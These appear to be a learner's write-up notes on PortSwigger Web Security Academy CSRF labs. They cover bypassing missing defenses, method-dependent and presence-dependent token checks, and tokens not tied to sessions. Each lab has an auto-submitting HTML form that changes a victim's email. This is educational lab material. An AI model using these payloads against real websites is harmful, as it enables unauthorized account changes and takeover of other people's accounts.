Requirement for csrf

	• Relevant action
	• Cookie based session handling
	• No unpredictable request parameters 

Can be automated using  burpesuite pro edition 



```
<form method="POST" action="https://0a39003e04cac15b80985df6004b00b0.web-security-academy.net/my-account/change-email">
	 <input type="hidden" name="email" value="anything%40web-security-academy.net"> </form> 
<script> 
	document.forms[0].submit();
 </script>
```

From <https://portswigger.net/web-security/csrf/lab-no-defenses> 


```
<form method="POST" action="https://0a39003e04cac15b80985df6004b00b0.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="viet@gmail.com">
</form>
<script>
        document.forms[0].submit();
</script>
```
**CSRF where token validation depends on request method**




Intercept we notice a csrf token
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/c04ead97-a67a-46ac-9cec-52adef46971d)


Remove csrf token we get a response that we need to change it
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/6c89d56c-5b43-4c9b-a612-d9268239279b)



Changine request to get and removing email change we can send it and get a 302 response
"Follow redirection" we notice that we changed the email without a csrf token
```
<form action="https://0a05007c04bf708c81e28a7200120078.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="viet2@gmail.com">
</form>
<script>
        document.forms[0].submit();
</script>
```

**CSRF where token validation depends on token being present**

![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/1b0c0949-c707-4f48-ab19-527524cf985e)


Deleting csrf parameter result in the 302 response 
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/771e5618-9d4d-4112-af7c-a90bee8ca4e2)


Exploit: 
```
<form method="POST" action="https://0aa1003d040b2b3f81817a48001f00f2.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="vi@gmail.com">
</form>
<script>
    document.forms[0].submit();
</script>
```

**CSRF where token is not tied to user session**

Cant changed email when removing csrf token
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/7f8f8bc7-fb21-49e1-98a5-c9e787f3e597)

Cant change to get request either to change email
See if csrf token is tied to user session
Check by logging into another user account and copying there csrf token 
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/b26f4b63-6f22-490f-aee2-e96c485aae5c)

 



Replacing the csrf parmeter we get a 302 response 
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/16b7e052-d04d-40c3-a6b2-b7a3357a4789)



CSRF token is used every time we changed an account so if we want to change another one we need another csrf token 
Our exploit:
```
<html>
    <body>
    <script> history.pushState(' ',' ', '/')</script>
    <form action="https://0a08004803a6fb1a8040b860005c004f.web-security-academy.net/my-account/change-email" method="POST">
        <input type="hidden" name="email" value="vffasf@gmail.com"/>
        <input type="hidden" name="csrf"  value="aIOCt2aXj52tiS7BFW5EVCy8k7UG8siS" />
        <input type="submit" value="submit request"/>
    </form>
    <script>
        document.forms[0].submit();
    </script>
    </body>
</html>
```























